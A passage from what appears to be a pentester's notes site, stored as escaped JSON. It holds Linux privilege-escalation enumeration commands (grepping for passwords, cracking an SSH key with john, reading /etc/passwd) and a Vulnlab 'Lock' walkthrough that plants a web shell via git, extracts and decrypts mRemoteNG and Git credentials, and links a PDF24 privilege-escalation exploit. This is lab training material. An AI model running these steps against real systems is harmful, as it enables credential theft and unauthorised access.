class=\"p\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"s1\"\u003e\u0026#39;password|username|credential\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGrab a hash from id_rsa :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh2john id_rsa \u0026gt; ssh.hash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejohn --wordlist\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/share/wordlist/rockyou.txt ssh.hash\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDisplay the routing table to view available networks and interfaces:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetstat -rn\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCheck  for domain environments and internal DNS configuration:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/resolv.conf\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnumerate users from /etc/passwd:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/passwd \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -f1 -d:\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDisplay information about groups on the system:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/group\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eList members of interesting groups, e.g., \u0026lsquo;sudo\u0026rsquo;:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egetent group sudo\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDisplay information about mounted file systems:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edf -h\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDisplay details of unmounted file systems from /etc/fstab:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/fstab \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e column -t\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eList all hidden files :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type f -name \u003cspan class=\"s2\"\u003e\u0026#34;.*\u0026#34;\u003c/span\u003e -exec ls -l \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep htb-student\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eList all hidden directories :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -type d -name \u003cspan class=\"s2\"\u003e\u0026#34;.*\u0026#34;\u003c/span\u003e -ls 2\u0026gt;/dev/null\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDisplay information about temporary files and directories:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -l /tmp /var/tmp /dev/shm\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003ch4 id=\"linux-services--internals-enumeration\"\u003eLinux Services \u0026amp; Internals Enumeration\u003c/h4\u003e\n\u003cp\u003e#Linux_Services_Internals_Enumeration\u003c/p\u003e","tags":[],"title":"Linux Privesc"},{"content":"Scan:\nNmap scan report for 10.10.91.85 Host is up (0.019s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Lock - Index | http-methods: |_ Potentially risky methods: TRACE 445/tcp open microsoft-ds? 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=000de57810f83b07; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=m9-ZDGG7FEDFvFsXs0KGSsjcYNk6MTcyMTgyNjA1ODkxNzQ3MjEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 24 Jul 2024 13:00:59 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en-US\u0026#34; class=\u0026#34;theme-auto\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Gitea: Git with a cup of tea\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=eccfe9ba6abb01a8; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=DF561VFH57BEAMRh7bfLXES0tyk6MTcyMTgyNjA2NDM4MTk1NTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 24 Jul 2024 13:01:04 GMT |_ Content-Length: 0 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: LOCK | NetBIOS_Domain_Name: LOCK | NetBIOS_Computer_Name: LOCK | DNS_Domain_Name: Lock | DNS_Computer_Name: Lock | Product_Version: 10.0.20348 |_ System_Time: 2024-07-24T13:02:20+00:00 | ssl-cert: Subject: commonName=Lock | Not valid before: 2024-07-23T12:57:30 |_Not valid after: 2025-01-22T12:57:30 |_ssl-date: 2024-07-24T13:03:00+00:00; -1s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Service Unavailable |_http-server-header: Microsoft-HTTPAPI/2.0\rWe recovered the token from previous commit and then download some repos: git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.91.85:3000/ellen.freeman/website.git\rGit configuration : git config --global user.email \u0026#34;you@example.com\u0026#34; git config --global user.name \u0026#34;Your Name\u0026#34;\rWe put our shell in the website and push : git add . git commit -m \u0026#34;Your commit message\u0026#34; git push\rWe found a config.xml: c:\\Users\\ellen.freeman\\Documents\u0026gt;type config.xml type config.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;mrng:Connections xmlns:mrng=\u0026#34;http://mremoteng.org\u0026#34; Name=\u0026#34;Connections\u0026#34; Export=\u0026#34;false\u0026#34; EncryptionEngine=\u0026#34;AES\u0026#34; BlockCipherMode=\u0026#34;GCM\u0026#34; KdfIterations=\u0026#34;1000\u0026#34; FullFileEncryption=\u0026#34;false\u0026#34; Protected=\u0026#34;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp\u0026#34; ConfVersion=\u0026#34;2.6\u0026#34;\u0026gt; \u0026lt;Node Name=\u0026#34;RDP/Gale\u0026#34; Type=\u0026#34;Connection\u0026#34; Descr=\u0026#34;\u0026#34; Icon=\u0026#34;mRemoteNG\u0026#34; Panel=\u0026#34;General\u0026#34; Id=\u0026#34;a179606a-a854-48a6-9baa-491d8eb3bddc\u0026#34; Username=\u0026#34;Gale.Dekarios\u0026#34; Domain=\u0026#34;\u0026#34; Password=\u0026#34;TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==\u0026#34; Hostname=\u0026#34;Lock\u0026#34; Protocol=\u0026#34;RDP\u0026#34; PuttySession=\u0026#34;Default Settings\u0026#34; Port=\u0026#34;3389\u0026#34; ConnectToConsole=\u0026#34;false\u0026#34; UseCredSsp=\u0026#34;true\u0026#34; RenderingEngine=\u0026#34;IE\u0026#34; ICAEncryptionStrength=\u0026#34;EncrBasic\u0026#34; RDPAuthenticationLevel=\u0026#34;NoAuth\u0026#34; RDPMinutesToIdleTimeout=\u0026#34;0\u0026#34; RDPAlertIdleTimeout=\u0026#34;false\u0026#34; LoadBalanceInfo=\u0026#34;\u0026#34; Colors=\u0026#34;Colors16Bit\u0026#34; Resolution=\u0026#34;FitToWindow\u0026#34; AutomaticResize=\u0026#34;true\u0026#34; DisplayWallpaper=\u0026#34;false\u0026#34; DisplayThemes=\u0026#34;false\u0026#34; EnableFontSmoothing=\u0026#34;false\u0026#34; EnableDesktopComposition=\u0026#34;false\u0026#34; CacheBitmaps=\u0026#34;false\u0026#34; RedirectDiskDrives=\u0026#34;false\u0026#34; RedirectPorts=\u0026#34;false\u0026#34; RedirectPrinters=\u0026#34;false\u0026#34; RedirectSmartCards=\u0026#34;false\u0026#34; RedirectSound=\u0026#34;DoNotPlay\u0026#34; SoundQuality=\u0026#34;Dynamic\u0026#34; RedirectKeys=\u0026#34;false\u0026#34; Connected=\u0026#34;false\u0026#34; PreExtApp=\u0026#34;\u0026#34; PostExtApp=\u0026#34;\u0026#34; MacAddress=\u0026#34;\u0026#34; UserField=\u0026#34;\u0026#34; ExtApp=\u0026#34;\u0026#34; VNCCompression=\u0026#34;CompNone\u0026#34; VNCEncoding=\u0026#34;EncHextile\u0026#34; VNCAuthMode=\u0026#34;AuthVNC\u0026#34; VNCProxyType=\u0026#34;ProxyNone\u0026#34; VNCProxyIP=\u0026#34;\u0026#34; VNCProxyPort=\u0026#34;0\u0026#34; VNCProxyUsername=\u0026#34;\u0026#34; VNCProxyPassword=\u0026#34;\u0026#34; VNCColors=\u0026#34;ColNormal\u0026#34; VNCSmartSizeMode=\u0026#34;SmartSAspect\u0026#34; VNCViewOnly=\u0026#34;false\u0026#34; RDGatewayUsageMethod=\u0026#34;Never\u0026#34; RDGatewayHostname=\u0026#34;\u0026#34; RDGatewayUseConnectionCredentials=\u0026#34;Yes\u0026#34; RDGatewayUsername=\u0026#34;\u0026#34; RDGatewayPassword=\u0026#34;\u0026#34; RDGatewayDomain=\u0026#34;\u0026#34; InheritCacheBitmaps=\u0026#34;false\u0026#34; InheritColors=\u0026#34;false\u0026#34; InheritDescription=\u0026#34;false\u0026#34; InheritDisplayThemes=\u0026#34;false\u0026#34; InheritDisplayWallpaper=\u0026#34;false\u0026#34; InheritEnableFontSmoothing=\u0026#34;false\u0026#34; InheritEnableDesktopComposition=\u0026#34;false\u0026#34; InheritDomain=\u0026#34;false\u0026#34; InheritIcon=\u0026#34;false\u0026#34; InheritPanel=\u0026#34;false\u0026#34; InheritPassword=\u0026#34;false\u0026#34; InheritPort=\u0026#34;false\u0026#34; InheritProtocol=\u0026#34;false\u0026#34; InheritPuttySession=\u0026#34;false\u0026#34; InheritRedirectDiskDrives=\u0026#34;false\u0026#34; InheritRedirectKeys=\u0026#34;false\u0026#34; InheritRedirectPorts=\u0026#34;false\u0026#34; InheritRedirectPrinters=\u0026#34;false\u0026#34; InheritRedirectSmartCards=\u0026#34;false\u0026#34; InheritRedirectSound=\u0026#34;false\u0026#34; InheritSoundQuality=\u0026#34;false\u0026#34; InheritResolution=\u0026#34;false\u0026#34; InheritAutomaticResize=\u0026#34;false\u0026#34; InheritUseConsoleSession=\u0026#34;false\u0026#34; InheritUseCredSsp=\u0026#34;false\u0026#34; InheritRenderingEngine=\u0026#34;false\u0026#34; InheritUsername=\u0026#34;false\u0026#34; InheritICAEncryptionStrength=\u0026#34;false\u0026#34; InheritRDPAuthenticationLevel=\u0026#34;false\u0026#34; InheritRDPMinutesToIdleTimeout=\u0026#34;false\u0026#34; InheritRDPAlertIdleTimeout=\u0026#34;false\u0026#34; InheritLoadBalanceInfo=\u0026#34;false\u0026#34; InheritPreExtApp=\u0026#34;false\u0026#34; InheritPostExtApp=\u0026#34;false\u0026#34; InheritMacAddress=\u0026#34;false\u0026#34; InheritUserField=\u0026#34;false\u0026#34; InheritExtApp=\u0026#34;false\u0026#34; InheritVNCCompression=\u0026#34;false\u0026#34; InheritVNCEncoding=\u0026#34;false\u0026#34; InheritVNCAuthMode=\u0026#34;false\u0026#34; InheritVNCProxyType=\u0026#34;false\u0026#34; InheritVNCProxyIP=\u0026#34;false\u0026#34; InheritVNCProxyPort=\u0026#34;false\u0026#34; InheritVNCProxyUsername=\u0026#34;false\u0026#34; InheritVNCProxyPassword=\u0026#34;false\u0026#34; InheritVNCColors=\u0026#34;false\u0026#34; InheritVNCSmartSizeMode=\u0026#34;false\u0026#34; InheritVNCViewOnly=\u0026#34;false\u0026#34; InheritRDGatewayUsageMethod=\u0026#34;false\u0026#34; InheritRDGatewayHostname=\u0026#34;false\u0026#34; InheritRDGatewayUseConnectionCredentials=\u0026#34;false\u0026#34; InheritRDGatewayUsername=\u0026#34;false\u0026#34; InheritRDGatewayPassword=\u0026#34;false\u0026#34; InheritRDGatewayDomain=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/mrng:Connections\u0026gt;\rMore Creds : type .git-credentials http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000\rDecrypt : [Jul 26, 2024 - 17:22:39 (CEST)] exegol-Algo /workspace # python3 exploit.py config.xml Name: RDP/Gale Hostname: Lock Username: Gale.Dekarios Password: ty8wnW9qCKDosXo6\rTool : https://github.com/gquere/mRemoteNG_password_decrypt/blob/master/mremoteng_decrypt.py\nConnect with remmina (RDP) User VL{d617459a7ff1a2b2ae7274d677095d59}\ncmd /c dir /A\rLocal privesc with pdf24 : https://packetstormsecurity.com/files/176206/PDF24-Creator-11.15.1-Local-Privilege-Escalation.html Tool: https://github.com/googleprojectzero/symboliclink-testing-tools Root VL{67895a961bc218ebc50d86b49f0ea192}\n","date":"2023-09-07","id":70,"permalink":"/notes/lab/vulnlab/lock/","summary":"\u003cp\u003eScan:\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.91.85\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.019s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e995\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http          Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Lock - Index\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-methods:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  Potentially risky methods: TRACE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3000/tcp open  ppp?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e fingerprint-strings:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   GenericLines, Help, RTSPRequest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.1 \u003cspan class=\"m\"\u003e400\u003c/span\u003e Bad Request\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Type: text/plain\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Connection: close\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Request\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   GetRequest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.0 \u003cspan class=\"m\"\u003e200\u003c/span\u003e OK\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Cache-Control: max-age\u003cspan class=\"o\"\u003e=\u003c/span\u003e0, private, must-revalidate, no-transform\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Type: text/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Set-Cookie: \u003cspan class=\"nv\"\u003ei_like_gitea\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e000de57810f83b07\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSameSite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLax\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Set-Cookie: \u003cspan class=\"nv\"\u003e_csrf\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003em9-ZDGG7FEDFvFsXs0KGSsjcYNk6MTcyMTgyNjA1ODkxNzQ3MjEwMA\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\u003cspan class=\"p\"\u003e;\u003c/span\u003e Max-Age\u003cspan class=\"o\"\u003e=\u003c/span\u003e86400\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSameSite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLax\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Frame-Options: SAMEORIGIN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Date: Wed, \u003cspan class=\"m\"\u003e24\u003c/span\u003e Jul \u003cspan class=\"m\"\u003e2024\u003c/span\u003e 13:00:59 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;!DOCTYPE html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;html \u003cspan class=\"nv\"\u003elang\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;en-US\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan 